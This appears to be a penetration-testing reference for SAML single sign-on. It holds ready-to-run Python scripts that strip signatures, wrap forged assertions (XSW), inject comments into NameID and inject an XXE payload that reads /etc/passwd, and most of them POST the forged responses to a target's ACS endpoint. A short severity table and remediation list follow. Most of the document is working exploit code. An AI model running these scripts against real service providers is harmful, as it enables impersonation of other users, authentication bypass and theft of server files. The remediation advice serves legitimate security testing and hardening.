# Reference: web-vuln-saml-sso

## Python Test Scripts

### Signature Stripping Script (Step 2)

```python
import sys
import re
import base64

with open(sys.argv[1], 'rb') as f:
    xml = f.read().decode('utf-8')

target_user = sys.argv[2]

# Strip Signature block
stripped = re.sub(r'<(?:ds:)?Signature\b.*?</(?:ds:)?Signature>', '', xml, flags=re.DOTALL)

# Change NameID to target user
modified = re.sub(r'(<(?:saml:)?NameID[^>]*>)[^<]+(</(?:saml:)?NameID>)',
                  rf'\g<1>{target_user}\g<2>', stripped)

encoded = base64.b64encode(modified.encode('utf-8')).decode('utf-8')
print("[+] Signature-stripped payload (base64):")
print(encoded[:80] + "...")

with open('/tmp/saml_stripped_b64.txt', 'w') as f:
    f.write(encoded)
```

Usage: `python3 script.py "$WORK_DIR/saml_original.xml" "$TARGET_USER"`

---

### XSW Testing Script (Step 3)

```python
import sys, re, base64, subprocess, os

with open(sys.argv[1], 'rb') as f:
    xml = f.read().decode('utf-8')

target = sys.argv[2]
acs_url = sys.argv[3]
work_dir = sys.argv[4]

def swap_nameid(xml_str, new_user):
    return re.sub(r'(<(?:saml:)?NameID[^>]*>)[^<]+(</(?:saml:)?NameID>)',
                  rf'\g<1>{new_user}\g<2>', xml_str)

def send_saml(label, payload, acs):
    encoded = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
    tmp = f'/tmp/xsw_{label}.txt'
    with open(tmp, 'w') as f:
        f.write(encoded)
    result = subprocess.run(
        ['curl', '-s', '-X', 'POST', acs,
         '--data-urlencode', f'SAMLResponse@{tmp}',
         '--max-time', '10',
         '-D', '-',
         '-L', '-o', '/dev/null'],
        capture_output=True, text=True
    )
    headers = result.stdout
    if 'set-cookie' in headers.lower() or '302' in headers or '200' in headers:
        status_line = [l for l in headers.split('\n') if l.startswith('HTTP')]
        print(f"  [{label}] -> {status_line[0].strip() if status_line else 'response received'}")
        if 'set-cookie' in headers.lower():
            print(f"  [!] Session cookie set -> possible XSW bypass")
    else:
        print(f"  [{label}] -> no session (likely blocked)")

sig_match = re.search(r'(<(?:ds:)?Signature\b.*?</(?:ds:)?Signature>)', xml, re.DOTALL)
sig_block = sig_match.group(1) if sig_match else ''
unsigned_assertion = swap_nameid(xml, target)

print("Running XSW variants against ACS...")
xsw_variants = {
    'XSW1-sig-in-extensions': re.sub(
        r'(<samlp:Response[^>]*>)',
        r'\1<samlp:Extensions>' + sig_block + '</samlp:Extensions>',
        swap_nameid(xml, target)
    ),
    'XSW2-unsigned-before-signed': swap_nameid(xml, target).replace(
        sig_block, sig_block + swap_nameid(xml, target)
    ),
}

for label, payload in xsw_variants.items():
    try:
        send_saml(label, payload, acs_url)
    except Exception as e:
        print(f"  [{label}] error: {e}")

print("\n[Note] Full XSW1-XSW8 testing is best performed with SAMLRaider (Burp extension)")
print("  Reference: https://github.com/SAMLRaider/SAMLRaider")
```

Usage: `python3 script.py "$WORK_DIR/saml_original.xml" "$TARGET_USER" "$ACS_URL" "$WORK_DIR"`

---

### Comment Injection Script (Step 4)

```python
import sys, re, base64, subprocess

with open(sys.argv[1], 'rb') as f:
    xml = f.read().decode('utf-8')

target = sys.argv[2]
legit = sys.argv[3]
acs_url = sys.argv[4]

# Comment injection: NameID becomes target<!--comment-->@legit-domain
domain = legit.split('@')[-1] if '@' in legit else 'example.com'
injected_id = f"{target}<!--{legit}-->"

modified = re.sub(
    r'(<(?:saml:)?NameID[^>]*>)[^<]+(</(?:saml:)?NameID>)',
    rf'\g<1>{injected_id}\g<2>',
    xml
)

encoded = base64.b64encode(modified.encode('utf-8')).decode('utf-8')
with open('/tmp/saml_comment.txt', 'w') as f:
    f.write(encoded)

print(f"[+] Injected NameID: {injected_id}")
result = subprocess.run(
    ['curl', '-s', '-X', 'POST', acs_url,
     '--data-urlencode', 'SAMLResponse@/tmp/saml_comment.txt',
     '--max-time', '10', '-D', '-', '-L', '-o', '/dev/null'],
    capture_output=True, text=True
)
print("[Response headers]:")
for line in result.stdout.split('\n')[:15]:
    if line.strip():
        print(' ', line.strip())
print("\n[!] If session opened for target user -> comment injection bypasses SP NameID parsing")
```

Usage: `python3 script.py "$WORK_DIR/saml_original.xml" "$TARGET_USER" "$LEGITIMATE_USER" "$ACS_URL"`

---

### XXE Injection Script (Step 6)

```python
import sys, base64, subprocess, re

with open(sys.argv[1], 'rb') as f:
    xml = f.read().decode('utf-8')

acs_url = sys.argv[2]
xxe_decl = sys.argv[3]

# Prepend XXE DOCTYPE and inject entity reference into Issuer
modified = xml.replace('<?xml version="1.0"?>', xxe_decl, 1)
modified = modified.replace('<?xml version="1.0" encoding="UTF-8"?>', xxe_decl, 1)

modified = re.sub(r'(<(?:saml:)?Issuer[^>]*>)[^<]+(</(?:saml:)?Issuer>)',
                  r'\g<1>&xxe;\g<2>', modified, count=1)

encoded = base64.b64encode(modified.encode('utf-8')).decode('utf-8')
with open('/tmp/saml_xxe.txt', 'w') as f:
    f.write(encoded)

print("[+] Sending XXE-injected SAML response...")
result = subprocess.run(
    ['curl', '-s', '-X', 'POST', acs_url,
     '--data-urlencode', 'SAMLResponse@/tmp/saml_xxe.txt',
     '--max-time', '10'],
    capture_output=True, text=True
)
output = result.stdout
if 'root:' in output or '/bin/' in output:
    print("[CRITICAL] XXE file read successful - /etc/passwd contents found in response")
else:
    print("[+] Response (first 300 chars):", output[:300])
    print("[Note] XXE may be out-of-band; check Burp Collaborator / SSRF canary if no output")
```

Usage: `python3 script.py "$WORK_DIR/saml_original.xml" "$ACS_URL" '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'`

---

## Severity Guide

| Severity | Finding | Description |
|----------|---------|-------------|
| CRITICAL | Signature stripping or XSW bypass | Arbitrary user impersonation / full authentication bypass |
| CRITICAL | XXE in SAML parser | File read, SSRF, or remote code execution |
| HIGH | NameID comment injection | Authenticate as privileged user |
| HIGH | SAML replay accepted | Session hijack using stolen assertion |
| MEDIUM | ACS URL not validated | Assertion forwarding to attacker-controlled endpoint |
| LOW | Self-signed IdP certificate accepted without pinning | MitM possible |

---

## Remediation

- Validate XML signature over the entire assertion, not just sub-elements
- Enforce strict canonicalization (C14N) to prevent XSW
- Use SAXParser in non-resolving mode to prevent XXE (disable external entities)
- Record and reject reused assertion IDs (InResponseTo + NotOnOrAfter)
- Strip XML comments before processing NameID
- Whitelist valid ACS URLs in the SP configuration
- Pin the IdP signing certificate; reject self-signed certs in production

## Tools

- SAMLRaider (Burp Extension): https://github.com/SAMLRaider/SAMLRaider
- SAML Raider CLI: https://github.com/CompassSecurity/SAMLRaider
- PortSwigger SAML lab: https://portswigger.net/web-security/saml
